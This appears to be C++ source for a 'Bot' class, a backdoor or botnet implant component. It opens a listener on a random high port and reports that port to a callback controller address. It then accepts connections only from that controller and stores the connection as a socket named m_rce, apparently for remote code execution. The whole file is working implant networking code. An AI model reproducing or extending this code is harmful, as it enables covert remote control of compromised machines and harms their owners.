#include "bot.hpp"
#include <arpa/inet.h>
#include <netinet/in.h>
#include <random>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

Bot::Bot(const sockaddr_in *cbaddr) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> distrib(30000, 50000);

    m_listener = -1;
    m_rce = -1;
    m_listener_port = distrib(gen);
    m_callback_addr = *cbaddr;
    m_running = false;
}

Bot::~Bot() {
    stop_listener();

    if (m_listener_thread.joinable()) {
        m_listener_thread.join();
    }
}

int Bot::callback() {
    int res;
    int sockfd;
    std::string port = std::to_string(m_listener_port);

    res = socket(AF_INET, SOCK_STREAM, 0);
    if (res == -1) {
        return -1;
    }
    sockfd = res;

    res = connect(sockfd, (sockaddr *)&m_callback_addr,
                  (socklen_t)sizeof(m_callback_addr));
    if (res == -1) {
        close(sockfd);
        return -1;
    }

    res = send(sockfd, port.c_str(), port.size(), 0);
    if (res == -1) {
        close(sockfd);
        return -1;
    }

    res = close(sockfd);
    return 0;
}

int Bot::start_listener() {
    int res;

    res = create_listener();
    if (res == -1) {
        stop_listener();
        return -1;
    }
    m_listener = res;

    return 0;
}

int Bot::stop_listener() {

    if (is_listening()) {
        close(m_listener);
    }

    if (is_running()) {
        m_running = false;
    }

    return 0;
}

int Bot::background_listener() {
    m_listener_thread = std::thread(&Bot::accept_loop, this);
    return 0;
}

int Bot::create_listener() {
    int res;
    int lfd;
    sockaddr_in laddr;
    laddr.sin_family = AF_INET;
    laddr.sin_addr.s_addr = INADDR_ANY;
    laddr.sin_port = htons(m_listener_port);

    res = socket(AF_INET, SOCK_STREAM, 0);
    if (res == -1) {
        return -1;
    }
    lfd = res;

    res = bind(lfd, (sockaddr *)&laddr, (socklen_t)sizeof(laddr));
    if (res == -1) {
        close(lfd);
        return -1;
    }

    res = listen(lfd, 5);
    if (res == -1) {
        close(lfd);
        return -1;
    }

    return lfd;
}

bool Bot::is_listening() { return m_listener > -1; }

bool Bot::is_running() { return m_running; }

void Bot::accept_loop() {
    if (!is_listening()) {
        return;
    }
    int res;
    m_running = true;
    sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    while (m_running) {
        res = accept(m_listener, (sockaddr *)&addr, &addr_len);
        if (res == -1) {
            continue;
        }

        if (addr.sin_addr.s_addr != m_callback_addr.sin_addr.s_addr) {
            close(res);
            continue;
        }

        m_rce = res;
    }
}